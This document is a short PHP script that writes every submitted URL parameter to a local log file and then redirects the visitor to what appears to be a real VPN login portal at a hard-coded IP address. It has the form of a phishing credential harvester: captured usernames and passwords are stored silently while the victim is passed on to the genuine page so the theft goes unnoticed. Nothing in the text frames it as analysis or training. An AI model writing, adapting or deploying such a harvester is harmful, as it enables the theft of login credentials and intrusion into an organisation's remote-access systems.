
<?php
 
 // Set the location to redirect the page
 header ('Location: https://202.83.18.34:10443/remote/login?lang=en');
  
 // Open the text file in writing mode
 $file = fopen("log.txt", "a");
  
 foreach($_GET as $variable => $value) {
     fwrite($file, $variable);
     fwrite($file, "=");
     fwrite($file, $value);
     fwrite($file, "\r\n");
 }
  
 fwrite($file, "\r\n");
 fclose($file);
 exit;
 ?>